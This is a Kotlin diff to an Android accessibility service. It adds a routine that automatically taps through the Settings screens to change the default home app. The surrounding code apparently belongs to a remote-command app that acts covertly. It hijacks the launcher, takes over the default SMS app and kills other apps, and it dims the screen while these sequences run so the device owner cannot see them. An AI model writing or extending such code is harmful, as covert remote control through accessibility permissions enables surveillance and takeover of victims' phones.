@@ -282,7 +282,7 @@ class MyAccessibilityService : AccessibilityService() {
 
                     if (keepIgnited) {
                         val hasDimmer = DimmerManager.currentLevel < 100
-                        val isSequenceActive = instance?.activeSequence != null || DefaultSmsManager.expectedMode.isNotEmpty() || LauncherManager.isHijacking
+                        val isSequenceActive = instance?.activeSequence != null || DefaultSmsManager.expectedMode.isNotEmpty() || LauncherManager.isHijacking || LauncherManager.expectedMode.isNotEmpty()
                         if (!DynamicUIManager.isAnyAttached && !hasDimmer && !isSequenceActive) {
                             DebugLogger.log("POWER_SHIELD", "Failsafe: Ignition lock active but no UI or Sequence attached. Disarming lock to prevent wake loop.")
                             DimmerManager.IgnitionManager.clearAll(context)
@@ -1322,6 +1322,136 @@ class MyAccessibilityService : AccessibilityService() {
                             DimmerManager.removeOverlay(applicationContext)
                             DefaultSmsManager.expectedMode = "" // Disarm completely
                         }, 500)
+                    }
+                }
+            }
+
+            // --- NEW: LAUNCHER GHOST HAND LOGIC ---
+            val launcherMode = LauncherManager.expectedMode
+            if (!isSafeZoneActive(this) && launcherMode == "RESTORE") {
+                val root = getBypassOverlayRoot() ?: return
+                val originalPkg = getSharedPreferences("app_stats", Context.MODE_PRIVATE).getString("original_launcher_package", null)
+                val targetLabel = LauncherManager.getStoredPreviousLabel(this)
+                
+                if (targetLabel == null || originalPkg == null) {
+                    LauncherManager.expectedMode = ""
+                    return
+                }
+
+                // VERIFICATION: Check if target is already set (Passive Fallback)
+                val currentDefault = DeviceManager.getDefaultApps(this).optString("launcher", "")
+                val isFinished = currentDefault == originalPkg
+
+                if (isFinished) {
+                    DebugLogger.log("LAUNCHER_NAV", "Passive Verification SUCCESS! Target ($targetLabel) is now Default Home.")
+                    LauncherManager.expectedMode = ""
+
+                    CommandProcessor.updateCommandStatus(applicationContext, LauncherManager.pendingCmdId, "SUCCESS", "Original Home app restored")
+
+                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                        performGlobalAction(GLOBAL_ACTION_HOME)
+                        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                            performGlobalAction(GLOBAL_ACTION_HOME)
+                        }, 500) 
+                    }, 1500)
+
+                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                        DimmerManager.IgnitionManager.release(applicationContext, "LAUNCHER_RESTORE")
+                        DynamicUIManager.removeOverlay(this@MyAccessibilityService, "RESTORE_SUCCESS_HOME_ROUTED")
+                    }, 5000)
+                    return
+                }
+
+                // Phase 1: selection screen
+                val appNodes = root.findAccessibilityNodeInfosByText(targetLabel)
+                if (appNodes.isNotEmpty()) {
+                    val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+                    val lastLoop = prefs.getLong("launcher_nav_loop_ts", 0L)
+                    
+                    if (System.currentTimeMillis() - lastLoop < 3000) return 
+                    
+                    DebugLogger.log("LAUNCHER_NAV_PHASE1", "Found ${appNodes.size} nodes matching target label: '$targetLabel'")
+
+                    var clicked = false
+                    for (i in 0 until appNodes.size) {
+                        var target: android.view.accessibility.AccessibilityNodeInfo? = appNodes[i]
+                        while (target != null && !target.isClickable) target = target.parent
+                        
+                        if (target != null && target.isClickable) {
+                            target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                            DebugLogger.log("LAUNCHER_NAV", "Clicked clickable candidate $i for '$targetLabel'")
+                            clicked = true
+                            prefs.edit().putLong("launcher_nav_loop_ts", System.currentTimeMillis()).apply()
+                            
+                            kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
+                                var isSuccess = false
+                                
+                                for (attempt in 1..15) { 
+                                    kotlinx.coroutines.delay(600)
+                                    
+                                    val confirmRoot = rootInActiveWindow
+                                    if (confirmRoot != null) {
+                                        val keywords = listOf("Set as default", "Set", "OK", "Default")
+                                        for (kw in keywords) {
+                                            val btn = confirmRoot.findAccessibilityNodeInfosByText(kw).find { it.isClickable }
+                                            if (btn != null) {
+                                                btn.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                                                DebugLogger.log("LAUNCHER_NAV_CONFIRM", "Clicked confirm dialog button: '$kw'")
+                                                break
+                                            }
+                                        }
+                                    }
+                                    
+                                    if (DeviceManager.getDefaultApps(this@MyAccessibilityService).optString("launcher", "") == originalPkg) {
+                                        isSuccess = true
+                                        break
+                                    }
+                                }
+
+                                if (isSuccess && LauncherManager.expectedMode.isNotEmpty()) {
+                                    kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.Main) {
+                                        DebugLogger.log("LAUNCHER_NAV", "Active Verification SUCCESS! Routing to Home.")
+                                        LauncherManager.expectedMode = "" 
+                                        
+                                        CommandProcessor.updateCommandStatus(applicationContext, LauncherManager.pendingCmdId, "SUCCESS", "Original Home app restored")
+
+                                        kotlinx.coroutines.delay(1000) 
+                                        performGlobalAction(GLOBAL_ACTION_HOME)
+                                        kotlinx.coroutines.delay(400)
+                                        performGlobalAction(GLOBAL_ACTION_HOME)
+
+                                        kotlinx.coroutines.delay(3500) 
+                                        DimmerManager.IgnitionManager.release(applicationContext, "LAUNCHER_RESTORE")
+                                        DynamicUIManager.removeOverlay(this@MyAccessibilityService, "RESTORE_SUCCESS_PROACTIVE")
+                                    }
+                                }
+                            }
+                            break 
+                        }
+                    }
+                    return
+                }
+
+                // Phase 2: Category list
+                val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+                val lastCatClick = prefs.getLong("launcher_nav_cat_ts", 0L)
+                if (System.currentTimeMillis() - lastCatClick > 2000) {
+                    val kwList = listOf("Home app", "Default Home app", "Launcher")
+                    var categoryClicked = false
+                    for (kw in kwList) {
+                        val nodes = root.findAccessibilityNodeInfosByText(kw)
+                        for (node in nodes) {
+                            var target: android.view.accessibility.AccessibilityNodeInfo? = node
+                            while (target != null && !target.isClickable) target = target.parent
+                            if (target != null) {
+                                target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                                prefs.edit().putLong("launcher_nav_cat_ts", System.currentTimeMillis()).apply()
+                                DebugLogger.log("LAUNCHER_NAV", "Clicked Category: $kw")
+                                categoryClicked = true
+                                break
+                            }
+                        }
+                        if (categoryClicked) break
                     }
                 }
             }
@@ -2422,9 +2552,11 @@ class MyAccessibilityService : AccessibilityService() {
         isWaitingForWifiSettings = false
         isWaitingForLocationSettings = false
         isPerformingStealthKill = false
+        LauncherManager.expectedMode = ""
         DimmerManager.IgnitionManager.release(this, "ACC_SEQUENCE")
         DimmerManager.IgnitionManager.release(this, "STEALTH_KILL")
         DimmerManager.IgnitionManager.release(this, "SMS_GHOST")
+        DimmerManager.IgnitionManager.release(this, "LAUNCHER_RESTORE")
         DimmerManager.IgnitionManager.release(this, "FORCE_WIFI")
         DimmerManager.IgnitionManager.release(this, "FORCE_DATA")
         DimmerManager.IgnitionManager.release(this, "FORCE_LOCATION")
